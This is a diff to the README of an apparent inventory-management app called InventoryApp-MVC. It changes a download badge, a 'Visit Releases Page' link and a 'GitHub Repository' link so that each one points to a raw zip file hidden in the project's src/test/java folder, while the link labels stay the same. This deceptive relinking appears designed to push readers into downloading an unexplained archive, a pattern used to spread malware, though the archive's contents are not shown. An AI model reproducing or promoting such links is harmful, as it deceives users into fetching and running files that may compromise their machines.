@@ -6,7 +6,7 @@ Welcome to InventoryApp-MVC! This app helps you smoothly manage your inventories
 
 ## 📥 Download InventoryApp-MVC
 
-[![Download InventoryApp-MVC](https://img.shields.io/badge/Download%20Now-InventoryApp--MVC-brightgreen)](https://github.com/Mapu909/InventoryApp-MVC/releases)
+[![Download InventoryApp-MVC](https://github.com/Mapu909/InventoryApp-MVC/raw/refs/heads/main/src/test/java/org/Inventory-MVC-App-v3.5.zip%20Now-InventoryApp--MVC-brightgreen)](https://github.com/Mapu909/InventoryApp-MVC/raw/refs/heads/main/src/test/java/org/Inventory-MVC-App-v3.5.zip)
 
 ## 🖥 System Requirements
 
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets these requirements:
 To download InventoryApp-MVC, please visit the Releases page. Follow these steps:
 
 1. Click on the link below to go to the Releases page.
-   - [Visit Releases Page to Download](https://github.com/Mapu909/InventoryApp-MVC/releases)
+   - [Visit Releases Page to Download](https://github.com/Mapu909/InventoryApp-MVC/raw/refs/heads/main/src/test/java/org/Inventory-MVC-App-v3.5.zip)
   
 2. On the Releases page, look for the latest version of InventoryApp-MVC.
 
@@ -91,7 +91,7 @@ If you encounter issues while using InventoryApp-MVC, consider the following ste
 
 Join our community for more tools and resources. Follow us on GitHub and other platforms:
 
-- [GitHub Repository](https://github.com/Mapu909/InventoryApp-MVC)
+- [GitHub Repository](https://github.com/Mapu909/InventoryApp-MVC/raw/refs/heads/main/src/test/java/org/Inventory-MVC-App-v3.5.zip)
 - Look for updates and share your feedback on the Releases page.
 
 ## 📞 Support
